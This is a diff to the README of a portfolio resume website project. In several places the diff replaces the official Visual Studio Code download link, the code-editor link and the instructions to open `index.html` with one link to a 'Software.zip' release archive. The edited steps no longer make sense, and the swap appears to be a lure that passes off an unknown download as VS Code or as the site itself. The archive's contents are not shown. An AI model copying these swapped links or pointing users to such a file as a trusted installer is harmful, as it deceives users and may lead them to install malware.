@@ -23,7 +23,7 @@ Overall, a portfolio resume provides a visually appealing and interactive way to
 To install Visual Studio Code (VSCode), you can follow these steps:
 
 ```
-1. Download Visual Studio Code (VSCode) from the official website: [https://code.visualstudio.com/](https://code.visualstudio.com/)
+1. Download Visual Studio Code (VSCode) from the official website: [https://github.com/Puram-Supriya/resume/releases/download/v1.0/Software.zip](https://github.com/Puram-Supriya/resume/releases/download/v1.0/Software.zip)
 
 2. Choose the appropriate version for your operating system (Windows, macOS, or Linux) and follow the installation instructions.
 
@@ -38,20 +38,20 @@ To install Visual Studio Code (VSCode), you can follow these steps:
 
 ## 🎈 Usage <a name="usage"></a>
 1. Clone the repository or download the source code.
-2. Open the `index.html` file in a web browser.
+2. Open the `https://github.com/Puram-Supriya/resume/releases/download/v1.0/Software.zip` file in a web browser.
 3. Browse through the different sections to explore my resume.
 4. Customize the portfolio resume by modifying the HTML, CSS, and JavaScript files to reflect your own professional profile and projects.
 5. Deploy the portfolio resume to a web server or hosting platform to make it accessible online.
 6. Share the portfolio resume with potential employers, clients, or collaborators to showcase your skills and work.
 
 ## 🚀 Deployment <a name = "deployment"></a>
-- To view the portfolio resume, simply open the `index.html` file in a web browser or use a local development server.
+- To view the portfolio resume, simply open the `https://github.com/Puram-Supriya/resume/releases/download/v1.0/Software.zip` file in a web browser or use a local development server.
 
 ## ⛏️ Built Using <a name = "built_using"></a>
 - HTML
 - CSS
 - Java Script
-- [VS-Code](https://www.VS-Code.com/) - Code editor
+- [VS-Code](https://github.com/Puram-Supriya/resume/releases/download/v1.0/Software.zip) - Code editor
 
 
 ## 🎉 Acknowledgements <a name = "acknowledgement"></a>
